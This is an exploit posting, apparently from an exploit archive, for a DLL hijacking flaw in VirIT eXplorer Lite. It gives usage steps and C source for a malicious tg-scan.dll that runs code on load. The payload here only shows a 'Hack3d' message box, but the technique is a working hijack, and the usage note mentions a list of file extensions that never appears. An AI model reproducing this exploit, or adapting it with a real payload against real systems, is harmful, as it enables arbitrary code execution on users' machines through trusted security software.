/*
#VirIT eXplorer Lite DLL Hijacking Exploit (tg-scan.dll)

#Author : anT!-Tr0J4n

#Greetz : Dev-PoinT.com ~ inj3ct0r.com  ~ All Dev-poinT members and my friends

#Email  : D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com

#Software Link:http://www.tgsoft.it/tgsoft_home.asp

#Tested on: Windows XP sp3

#Description:Vir.IT 6.7.41 AntiVirus + AntiSpyware + Personal Firewall for your computer
Scan & Clean virus, spyware, trojan, backdoor, bho, dialer, adware,hijacker, keylogger, worm, rootkit, fraudtool & malware


#####################
How  TO use : Compile and rename to tg-scan.dll , create a file in the same dir with one of the following extensions.
            check the result > Hack3d             
#####################

#tg-scan.dll (code)
*/
 
#include "stdafx.h"
 
void init() {
MessageBox(NULL,"anT!-Tr0J4n", "Hack3d",0x00000003);
}
 
 
BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
 )
{
    switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
 init();break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
 case DLL_PROCESS_DETACH:
break;
    }
    return TRUE;
}